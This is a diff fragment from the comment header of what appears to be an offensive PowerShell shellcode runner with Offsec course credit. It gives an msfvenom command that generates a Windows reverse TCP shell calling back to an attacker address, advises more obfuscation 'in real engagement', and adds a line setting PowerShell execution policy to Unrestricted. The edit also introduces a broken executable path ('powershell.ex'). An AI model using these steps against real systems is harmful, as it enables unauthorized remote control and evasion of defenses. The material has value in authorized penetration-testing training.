@@ -5,7 +5,8 @@ Generate shell code using at least the following command:
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f powershell -v sc
 Use more obfuscation in real engagement.
 Run in x86 version of PowerShell.
-  %SystemRoot%\SysWow64\WindowsPowerShell\v1.0\powershell.exe
+  %SystemRoot%\SysWow64\WindowsPowerShell\v1.0\powershell.ex
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 Credit Offsec 2023 - For Educational Puposes Only
 #>
 
